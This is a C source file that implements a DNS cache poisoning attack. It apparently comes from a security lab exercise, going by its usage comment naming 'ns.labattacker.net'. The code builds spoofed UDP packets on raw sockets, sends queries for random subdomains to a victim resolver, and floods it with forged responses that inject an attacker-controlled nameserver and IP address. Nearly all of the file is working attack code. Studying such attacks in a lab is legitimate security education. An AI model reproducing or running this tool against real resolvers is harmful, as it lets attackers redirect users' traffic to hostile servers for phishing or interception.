
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* MACRO declarations */
#define DNSSERV_BIND_PORT   53                          // listen port on DNS server
#define DNSSERV_SRC_PORT    33333                       // source port of DNS server
#define UDP_TIMEOUT         1                           // max timeout in UDP response
#define SMALL_TTL           64                          // a small Time-To-Live
#define BIG_TTL             86400                       // a big Time-To-Live (1D)
#define RAND_LEN            5                           // length of random subdomain
#define DNSRESP_SIZE        1024                        // max size of DNS response
#define RNDSD_LEN           256                         // max subdomain length
#define N_DUP_REQ           16                          // default number of duplicate requests
#define N_DUP_RESP          128                         // default number of duplicate responses
#define N_TRIES             64                          // default number of poisoning attacks
#define MAX_DUP_REQ         1002                        // max number of duplicate requests
#define MAX_DUP_RESP        1002                        // max number of duplicate responses
#define DNS_FLAG_RESP       0x8400                      // flags for DNS response packet
#define DNS_FLAG_QUES       0x0100                      // flags for DNS question packet
#define IPHDR_LEN           sizeof(struct iphdr)        // IP header length
#define UDPHDR_LEN          sizeof(struct udphdr)       // UDP header length
#define PRNT_HELP                                       /* print usage message */           \
    printf( "Usage: %s <attributes> \n"                                                     \
            "\t--domain\tDomain that you want to poison (foo.gr)\n"                         \
            "\t--ip\t\tIP address of DNS server you want to poison (1.1.1.1)\n"             \
            "\t--attacter-ns\tDomain of attacker's nameserver (attacker.gr)\n"              \
            "\t--attacter-ip\tIP of attacker's nameserver (4.4.4.4)\n"                      \
            "\t--orig-ns\tIP address of the original nameserver (9.9.9.9 -> ns.foo.gr)\n"   \
            "\n"                                                                            \
            "\t--n-reqests\t# of duplicate requests\n"                                      \
            "\t--n-responses\t# of cache poisoning attemps (#spoofed responses)\n"          \
            "\t--n-tries\t# of poisoning attacks\n"                                         \
            "\t--verify\tVerify whether attack was successfull. This makes attack slower.\n"\
            "\n"                                                                            \
            "\t--help\t\tDisplay this message and exit\n\n", argv[0] )

/* type/enum definitions */
typedef struct { uint8_t *p; size_t l; } pkt_t;         // packet + length

/* DNS class and type enums */
enum RR_TYPE   {A=1, NS=2, CNAME=5, SOA=6, PTR=12, MX=15, TXT=16};
enum DNS_CLASS {IN=1, CH=3, HS=4};
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                      PACKET TRANSMISSION                                      //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////

uint16_t chksum( uint8_t buf[], size_t buflen )
{
    uint32_t sum = 0, i;                                // checksum, iterator

    if( buflen < 1 ) return 0;                          // if buffer is empty, exit

    for(i=0; i<buflen-1; i+=2) sum+=*(uint16_t*)&buf[i];// add all half-words together  

    if( buflen & 1 ) sum += buf[buflen - 1];            // if you missed last byte, add it

    return ~((sum >> 16) + (sum & 0xffff));             // fold high to low order word
                                                        // return 1's complement
}
// ------------------------------------------------------------------------------------------------

int snd_spfd_pkt( char *srcip, char *dstip, uint16_t sport, uint16_t dport, pkt_t dnspkt )
{
    pkt_t pkt = {                                       // buffer for whole packet
        .p = malloc(IPHDR_LEN + UDPHDR_LEN + dnspkt.l), // allocate memory for the packet
        .l =        IPHDR_LEN + UDPHDR_LEN + dnspkt.l
    };

    struct sockaddr_in trg_addr = {                     // target's address information
            .sin_zero        = { 0,0,0,0,0,0,0,0 },     // zero this out
            .sin_family      = AF_INET,                 // IPv4
            .sin_port        = 0,                       // ignore this      
            .sin_addr.s_addr = inet_addr(dstip)         // set destination address
        };

    struct iphdr  *iph  = (struct iphdr*)  pkt.p;       // IP header within packet
    struct udphdr *udph = (struct udphdr*) (iph + 1);   // UDP header within packet

    int sd, retn = 0, on = 1;                           // raw socket descriptor / return value / flag


   
    bzero(pkt.p, pkt.l);                                // zero out fields first

    /* fill pseudo-header fields in IP header */
    iph->saddr    = inet_addr(srcip);                   // spoofed source IP
    iph->daddr    = inet_addr(dstip);                   // target's IP
    iph->protocol = IPPROTO_UDP;                        // set upper layer protocol (it's UDP)
    iph->tot_len  =  htons(pkt.l - IPHDR_LEN);          // set packet's total length

    /* fill pseudo-header fields in UDP header */
    udph->source = htons(sport);                        // set source port
    udph->dest   = htons(dport);                        // set destination port
    udph->len    = htons(pkt.l - IPHDR_LEN);            // set packet length    
    udph->check  = 0;                                   // initialize checksum
    
    /* copy packet payload */
    memcpy(&pkt.p[IPHDR_LEN + UDPHDR_LEN], dnspkt.p, dnspkt.l);

    /* time for our trick. pseudo-header is ready */    
    udph->check   = chksum(pkt.p, pkt.l);               // checksum of pseudo-header + UDP payload

    /* fill the rest of IP header */
    iph->version  = 4;                                  // IPv4
    iph->ihl      = 5;                                  // no options
    iph->tos      = 0;                                  // no QoS
    iph->tot_len  = htons(pkt.l);                       // set packet's total length
    iph->id       = htons(9999);                        // set some ID
    iph->frag_off = 0;                                  // no fragments (and no offset)
    iph->ttl      = 64;                                 // TTL
    iph->check    = 0;                                  // set to 0 for now
    iph->check    = chksum(pkt.p, 20);                  // calculate checksum of the header


    /* ----------------------------------
     * Send the packet using raw sockets
     * ---------------------------------- */

    /* make a raw socket */
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        retn = -1;                                      // failure
    }

    else if( setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
        retn = -1;                                      // failure
    }

    else if(sendto(sd, pkt.p, pkt.l, 0, (struct sockaddr*)&trg_addr, sizeof(trg_addr)) < 0) {

        retn = -1;                                      // failure
    }

    free(pkt.p);                                        // release allocated memory
    close(sd);                                          // close socket
    return retn;                                        // success!
}


int snd_pkt( char *dstip, uint16_t dport, pkt_t dnspkt )
{
    int sockd;                                          // socket descriptor
    struct sockaddr_in trg_addr = {                     // DNS's address information
            .sin_zero        = { 0,0,0,0,0,0,0,0 },     // zero this out
            .sin_family      = AF_INET,                 // IPv4
            .sin_port        = htons(dport),            // DNS server's port
            .sin_addr.s_addr = inet_addr(dstip)         // set destination address
        };


    if((sockd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Error! Cannot create UDP socket");      
        return -1;                                      // failure :(
    }

    if(sendto(sockd, dnspkt.p, dnspkt.l, 0, (struct sockaddr*)&trg_addr, sizeof(trg_addr)) < 0) {
        perror("Error! Cannot send UDP packet");
        close( sockd );                                 // close socket
        return -1;                                      // failure :(
    }

    return sockd;                                       // return that open socket
}


int rcv_pkt( int sockd, pkt_t *pkt )
{
    struct timeval tv = { .tv_sec = UDP_TIMEOUT, .tv_usec = 0 };
    int n, retn = 0;                                    // return value (assume success)
    

    pkt->p = malloc(DNSRESP_SIZE);
    pkt->l = DNSRESP_SIZE;                              
  
    if( setsockopt(sockd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0 ) {
        perror("Error! Cannot set timeout for UDP socket");
        retn = -1;                                      // failure
    }

    else if( (n = recvfrom(sockd, pkt->p, pkt->l, 0, NULL, NULL)) < 0 ) {
        //perror("Error! Cannot receive UDP packet");
        retn = -1;                                      // failure
    }

    pkt->l = n;                                         // set packet size
      
    close( sockd );                                   
    return retn;                                        
}
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                    DNS PACKET MANIPULATION                                    //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////


void mk_dns_hdr( pkt_t *P, uint16_t id, uint16_t flags, uint16_t  qcnt, uint16_t anscnt, 
                 uint16_t nscnt, uint16_t addcnt )
{
    struct dnshdr {                                     // DNS packet header
        uint16_t id;                                    // identifier
        uint16_t flags;                                 // flags and codes
        uint16_t ques_cnt, ansr_cnt, ns_cnt, addr_cnt;  // record counters
    } __attribute__ ((packed)) *dnsh;


    P->p = malloc( sizeof(struct dnshdr) );             // allocate memory for header
    P->l = sizeof(struct dnshdr);                       // adjust size

    dnsh = (struct dnshdr*) P->p;                       // set struct pointer

    dnsh->id       = htons(id    );                     // set header fields
    dnsh->flags    = htons(flags );
    dnsh->ques_cnt = htons(qcnt  );
    dnsh->ansr_cnt = htons(anscnt);
    dnsh->ns_cnt   = htons(nscnt );
    dnsh->addr_cnt = htons(addcnt);
}


void del_dns_pkt( pkt_t *P )
{
    free(P->p);                                         // release allocated memory
}


uint8_t app_q_rec( pkt_t *P, uint16_t qclass, uint16_t qtype, const char *qname )
{
    char    *tok, *s1, *s2;                             // auxiliary pointers
    uint8_t namoff;                                     // offset of qname in packet

    P->p = realloc(P->p, P->l + strlen(qname) +2 +2 +2);

    s1 = malloc(strlen(qname) + 1);                     // get a backup
    s2 = s1;
    strcpy(s1, qname);

    namoff = P->l;                                      // name starts from here

    for(tok=strtok(s2, "."); tok; tok=strtok(NULL, ".")) {

        sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok );
        P->l += strlen(tok) + 1;                        // move pointer
    }

    P->p[P->l++]  = '\0';                               // finish with a NULL
    free(s1);                                           // release temp string

    *(uint16_t*)&P->p[P->l]     = htons(qtype);         // set type
    *(uint16_t*)&P->p[P->l + 2] = htons(qclass);        //  and class

    P->l += 4;                                          // adjust packet's length

    return namoff;                                      // return offset
}


uint8_t app_r_rec( pkt_t *P, uint16_t class, uint16_t type, char *rdata, uint8_t off )
{
    char    *tok, *s1, *s2;                             // auxiliary pointers
    uint8_t namoff = -1;                                // offset of qname in packet

	int typelen ;

	if(type == NS) typelen= strlen((rdata)+2);
	else if(type==A) typelen=4;
	
    P->p = realloc(P->p, P->l +2 +2 +2 +4 +2 +typelen );

      
    *(uint16_t*)&P->p[P->l]     = htons(0xc000 | off);  // 0xc0 -> pointer to a name string
    *(uint16_t*)&P->p[P->l + 2] = htons(type);          // set type
    *(uint16_t*)&P->p[P->l + 4] = htons(class);         // set class
    *(uint32_t*)&P->p[P->l + 6] = htonl(BIG_TTL);       // set a big TTL

    P->l += 10;                                         // adjust size

    switch(type)                                        // check RR type
    {
        // --------------------------------------------------------------------
        case A:
            /* An A RR. rdata is the resolved IP address */
            *(uint16_t*)&P->p[P->l + 0] = htons(4);         
            *(uint32_t*)&P->p[P->l + 2] = inet_addr(rdata);
            P->l += 6;                              // adjust size
            break;
        // --------------------------------------------------------------------
        case NS:
            /* An NS RR. rdata is the nameserver's domain */            
            *(uint16_t*)&P->p[P->l] = htons(strlen(rdata)+2);
            P->l += 2;                              // adjust size              

            s1 = malloc(strlen(rdata) + 1);             // get a backup
            s2 = s1;
            strcpy(s1, rdata);

            namoff = P->l;                              // name starts from here

            for(tok=strtok(s2, "."); tok; tok=strtok(NULL, ".")) {
                sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok );
                P->l += strlen(tok) + 1;                // move pointer
            }

            P->p[P->l++]  = '\0';                       // finish with a NULL
            free(s1);                                   // release temp string

            break;
        
        case CNAME:
        case SOA:
        case PTR:
        case MX:
        case TXT:
            break;
        // --------------------------------------------------------------------
    }
    return namoff;                                      // return offset
}
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                MAIN CODE - DNS CACHE POISONING                                //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////

// ------------------------------------------------------------------------------------------------
// Command:
// gcc dnspoison.c -o dnspoison
// sudo ./dnspoison --attack_NS_IP=192.168.0.102 --poison_domain=example.net --real_NS=199.43.135.53 --attack_NS_name=ns.labattacker.net --attacker_IP=172.20.57.31 --n-req=100 --n-resp=1000 --n-try=1000

int main( int argc, char *argv[] )
{      
    /*struct option longopt[] = {
        {"poison_domain",     required_argument, 0, 'a'}, 
        {"victim_DNS_IP",         required_argument, 0, 'b'}, 
        {"attack_NS_name",required_argument, 0, 'c'}, 
        {"attacker_IP",required_argument, 0, 'd'}, 
        {"real_NS",    required_argument, 0, 'e'}, 
        {"n-req", required_argument, 0, 'f'}, 
        {"n-resp",required_argument, 0, 'g'},
        {"n-try",    required_argument, 0, 'i'},
        {"verify",     no_argument,       0, 'j'},      
        {"help",       no_argument,       0, 'h'},
        {0,            0,                 0,  0 }
    };*/
struct option longopt[] = {
        /* short options are dummy. Hide them from user and use only the long ones. */
        {"domain",     required_argument, 0, 'a'}, 
        {"ip",         required_argument, 0, 'b'}, 
        {"attacker-ns",required_argument, 0, 'c'}, 
        {"attacker-ip",required_argument, 0, 'd'}, 
        {"orig-ns",    required_argument, 0, 'e'}, 
        {"n-requests", required_argument, 0, 'f'}, 
        {"n-responses",required_argument, 0, 'g'},
        {"n-tries",    required_argument, 0, 'i'},
        {"verify",     no_argument,       0, 'j'},      
        {"help",       no_argument,       0, 'h'},
        {0,            0,                 0,  0 }
    };

    pkt_t D = {.p = NULL, .l = 0 };                     // DNS packet

    char    *domain=NULL, *ip=NULL, *attacker_ns=NULL, *attacker_ip=NULL, *orig_ns=NULL;
    uint16_t ndupreq=N_DUP_REQ, ndupresp=N_DUP_RESP, 
             ntries=N_TRIES, verify=0;                  // how aggressive is attack?
    char     rndsd[RNDSD_LEN];                          // random subdomain
    int      sockd[MAX_DUP_REQ];                        // UDP socket descriptors
    int      opt, longidx = 0;                          // getopt stuff
    int      cnt, i;                                    // counters

    while( (opt = getopt_long(argc, argv, "a:b:c:d:e:f:g:i:jh", longopt, &longidx)) != -1) 
        switch(opt) 
        {           
            case 'a': domain      = optarg; break;      // Attacking domain 
            case 'b': ip          = optarg; break;      // IP of the attacking nameserver
            case 'c': attacker_ns = optarg; break;      // attacker's nameserver
            case 'd': attacker_ip = optarg; break;      // attacker's IP
            case 'e': orig_ns     = optarg; break;      // spoofed nameserver
            case 'f': ndupreq     = atoi(optarg); break;// # of duplicate requests
            case 'g': ndupresp    = atoi(optarg); break;// # of cache poisoning attempts
            case 'i': ntries      = atoi(optarg); break;// # of attacks
            case 'j': verify      = 1;      break;      // verify attack
            default : PRNT_HELP; return -1;             // failure
        }

    if( !domain || !ip || !attacker_ns || !attacker_ip || !orig_ns ||
        ndupreq  < 1 || ndupreq  > MAX_DUP_REQ ||
        ndupresp < 1 || ndupresp > MAX_DUP_RESP ) 
    { 
        PRNT_HELP;                                      // something is missing
        return -1; 
    }

    srand(time(NULL));                                  // initialize PRG

    for( cnt=1; cnt<=ntries; cnt++ )
    {
        printf( "Attacking attempt #%d\n", cnt );

        bzero(rndsd, RNDSD_LEN);                        // clear buffer
        for(i=0; i<RAND_LEN; ++i)
            rndsd[i] = 'a' + rand() % 26;               // fill a random subdomain

        rndsd[RAND_LEN] = '.';
        strncat(rndsd, domain, RNDSD_LEN-RAND_LEN-1);   // append the target domain

        printf( "Generating random subdomain: %s\n", rndsd );

        printf( "Sending %d duplicate requests\n", ndupreq );
        for( i=0; i<ndupreq; ++i )                          
        {
            mk_dns_hdr(&D, rand() % 0xffff, DNS_FLAG_QUES, 1, 0, 0, 0); 
            app_q_rec(&D, IN, A, rndsd);                // append question
            sockd[i] = snd_pkt(ip,DNSSERV_BIND_PORT,D); // send packet and store socket
            del_dns_pkt(&D);                            // cleanup packet buffer
        }


        /* ------------------------
         *     Actual attack
         * --------------------- */
        printf( "Flooding with %d spoofed responses\n", ndupresp );

        for( i=0; i<ndupresp; ++i )
        {
            int off1, off2;                             // name offsets

            mk_dns_hdr(&D, rand() % 0xffff, DNS_FLAG_RESP, 1, 1, 1, 1+1);

            off1 = app_q_rec(&D, IN, A,  rndsd);
                   app_r_rec(&D, IN, A,  attacker_ip, off1);
            off2 = app_r_rec(&D, IN, NS, attacker_ns, off1+RAND_LEN+1 );
                   app_r_rec(&D, IN, A,  attacker_ip, off2);
	
	D.p = realloc(D.p, D.l + 11 );	
	D.p[D.l]=0; 							// Name <ROOT>
	*(uint16_t*)&(&D)->p[D.l + 1] = htons((uint16_t)0x0029);        // type OPT (41)
	*(uint16_t*)&(&D)->p[D.l + 3] = htons((uint16_t)0x1000);	// UDP Payload size(4096)
	D.p[D.l + 5] = 0;						// Extended RCODE
	D.p[D.l + 6] = 0;						// EDNS0 Version
	*(uint16_t*)&(&D)->p[D.l + 7] = htons((uint16_t)0x8000);	// Z = 0x8000
	*(uint16_t*)&(&D)->p[D.l + 9] = htons((uint16_t)0);		// Data length (0)
	
   	D.l += 11;

            // assume source port is not randomized
            snd_spfd_pkt(orig_ns, ip, DNSSERV_BIND_PORT, DNSSERV_SRC_PORT, D);
            del_dns_pkt(&D);    
        }

        for( i=0; i<ndupreq; ++i )
        {
			if( !verify ) {                             
                close( sockd[i] );                      // simply close socket
                continue;                               // and skip the rest
            }

            rcv_pkt(sockd[i], &D);            
    
            if( D.l > 8 && *(uint16_t*)&D.p[6] == htons(1) )
            {
                printf( "\n\nPoisoning success!\n\n" );
                return 0;
            } 
            D.l = 0;
            free( D.p );  
	        printf("Packet %d\n", i);
        }       
    }

    return 0; 
}
// ------------------------------------------------------------------------------------------------
